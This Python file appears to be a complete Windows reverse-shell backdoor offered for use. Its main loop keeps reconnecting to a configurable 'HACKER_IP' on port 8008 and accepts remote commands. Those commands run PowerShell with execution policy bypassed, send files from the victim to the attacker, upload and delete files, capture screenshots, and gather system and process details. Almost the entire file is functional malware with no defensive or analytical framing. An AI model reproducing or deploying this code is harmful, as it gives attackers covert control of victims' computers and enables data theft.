import socket
import os
import subprocess
import pyautogui
import shutil
import time
import struct
from datetime import datetime

# Global variable to maintain current working directory
CURRENT_DIR = os.getcwd()

def execute_powershell(cmd):
    try:
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
            capture_output=True,
            text=True,
            shell=True
        )
        return result.stdout.strip() or result.stderr.strip()
    except Exception as e:
        return f"PowerShell Error: {str(e)}"

def list_commands():
    return """
    Available Commands:
    ?                - Show this help menu
    ls, dir          - List files in the current directory
    cd <path>        - Change directory to <path>
    pwd              - Show current working directory
    ps <cmd>         - Execute PowerShell command
    download <file>  - Download a file from target system
    upload <file>    - Upload a file to target system
    create <file>    - Create an empty file
    mkdir <folder>   - Create a new folder
    delete <file>    - Delete a file
    copy <src> <dst> - Copy a file or folder (recursively)
    screenshot       - Take a screenshot and send it
    sysinfo          - Get system information
    processes        - List running processes
    exit             - Close the connection
    """

def execute_command(cmd, conn):
    try:
        if cmd == "?":
            return list_commands()

        elif cmd.lower() in ["ls", "dir"]:
            return execute_powershell("Get-ChildItem -Force | Format-Table -Wrap -AutoSize | Out-String -Width 8192")

        elif cmd.startswith("cd "):
            path = cmd[3:]
            os.chdir(path)
            return f"Current directory: {os.getcwd()}"

        elif cmd == "pwd":
            return os.getcwd()

        elif cmd.startswith("ps "):
            return execute_powershell(cmd[3:])

        elif cmd.startswith("download "):
            filepath = cmd[9:]
            if os.path.exists(filepath):
                try:
                    filesize = os.path.getsize(filepath)
                    conn.send(f"FILESIZE {filesize}".encode())
                    with open(filepath, "rb") as f:
                        while chunk := f.read(4096):
                            conn.send(chunk)
                    return "File transfer complete"
                except Exception as e:
                    return f"Error transferring file: {str(e)}"
            return "FileNotFound"

        elif cmd.startswith("upload "):
            parts = cmd.split(" ", 1)
            if len(parts) < 2:
                return "Usage: upload <file>"
            filename = parts[1]
            conn.send("READY".encode())
            file_size = struct.unpack("!I", conn.recv(4))[0]
            with open(filename, "wb") as f:
                received = 0
                while received < file_size:
                    chunk = conn.recv(min(4096, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            return f"File {filename} uploaded successfully"

        elif cmd.startswith("create "):
            filename = cmd[7:]
            open(filename, "w").close()
            return f"File {filename} created"

        elif cmd.startswith("mkdir "):
            foldername = cmd[6:]
            try:
                os.makedirs(foldername, exist_ok=True)
                return f"Folder created: {foldername}"
            except Exception as e:
                return f"Error creating folder: {str(e)}"

        elif cmd.startswith("delete "):
            filename = cmd[7:]
            if os.path.exists(filename):
                os.remove(filename)
                return f"File {filename} deleted"
            return "FileNotFound"

        elif cmd.startswith("copy "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                return "Usage: copy <src> <dst>"
            src, dst = parts[1], parts[2]
            if os.path.exists(src):
                if os.path.isdir(src):
                    shutil.copytree(src, dst)  # Recursively copy folders
                    return f"Folder copied to {dst}"
                else:
                    shutil.copy(src, dst)  # Copy single file
                    return f"File copied to {dst}"
            return "Source not found"

        elif cmd == "screenshot":
            filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            abs_path = os.path.join(CURRENT_DIR, filename)
            pyautogui.screenshot(abs_path)
            with open(abs_path, "rb") as f:
                data = f.read()
            os.remove(abs_path)
            return data

        elif cmd == "sysinfo":
            return execute_powershell("Get-ComputerInfo | Select-Object *")

        elif cmd == "processes":
            return execute_powershell("Get-Process | Format-Table Name,CPU,Id | Out-String -Width 8192")

        else:
            return "UnknownCommand"

    except Exception as e:
        return f"Error: {str(e)}"

def main():
    HACKER_IP = "192.168.1.14"  # CHANGE THIS
    HACKER_PORT = 8008

    while True:
        try:
            with socket.socket() as s:
                s.connect((HACKER_IP, HACKER_PORT))
                while True:
                    # Clear any leftover data in the buffer first
                    s.setblocking(0)  # Non-blocking mode to check for leftover data
                    try:
                        while s.recv(4096):  # Clear the buffer
                            pass
                    except BlockingIOError:
                        pass  # No more data to read
                    s.setblocking(1)  # Back to blocking mode

                    # Now wait for and process the actual command
                    cmd = s.recv(4096).decode().strip()
                    if not cmd:
                        continue

                    if cmd == "exit":
                        break

                    response = execute_command(cmd, s)
                    if isinstance(response, str):
                        s.send(response.encode())
                    else:
                        s.send(struct.pack("!I", len(response)) + response)

        except Exception as e:
            print(f"Connection error: {str(e)}")
            time.sleep(10)
            continue

if __name__ == "__main__":
    main()